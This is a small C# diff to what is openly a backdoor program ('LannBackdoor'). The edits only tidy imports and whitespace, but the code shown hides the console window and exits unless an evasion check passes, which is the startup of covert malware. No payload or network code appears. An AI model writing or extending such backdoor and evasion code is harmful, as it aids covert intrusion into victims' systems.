@@ -1,4 +1,4 @@
-﻿using System.Runtime.InteropServices;
+﻿using System.Text;
 using LannEvasion;
 using LannLogger;
 using LannUtils;
@@ -18,7 +18,7 @@ public static class LannBackdoor {
     private static int _serverId;
 
     public static async Task Main() {
-        Console.OutputEncoding = System.Text.Encoding.UTF8;
+        Console.OutputEncoding = Encoding.UTF8;
 
         if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
         else PInvoke.HideWindow();
@@ -29,7 +29,7 @@ public static class LannBackdoor {
             Environment.Exit(0);
             return;
         }
-        
+
         Logger.Information("Evasion check passed!");
 
         Logger.Information("Ohayou, ばか!");
